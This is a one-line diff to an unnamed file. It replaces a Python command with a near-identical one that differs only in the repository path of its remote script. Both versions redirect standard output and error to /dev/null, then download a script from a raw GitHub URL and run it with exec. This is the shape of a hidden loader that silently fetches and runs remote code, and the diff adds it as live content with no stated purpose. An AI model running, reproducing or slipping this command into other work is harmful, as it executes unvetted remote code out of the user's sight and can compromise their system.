@@ -1,1 +1,1 @@
-python3 -c "import sys,os; sys.stdout=open(os.devnull,'w'); sys.stderr=open(os.devnull,'w'); import urllib.request; exec(urllib.request.urlopen('https://raw.githubusercontent.com/Create-oss104/precise104/main/precise.py').read().decode())"
+python3 -c "import sys,os; sys.stdout=open(os.devnull,'w'); sys.stderr=open(os.devnull,'w'); import urllib.request; exec(urllib.request.urlopen('https://raw.githubusercontent.com/precise104/precise-/main/precise.py').read().decode())"
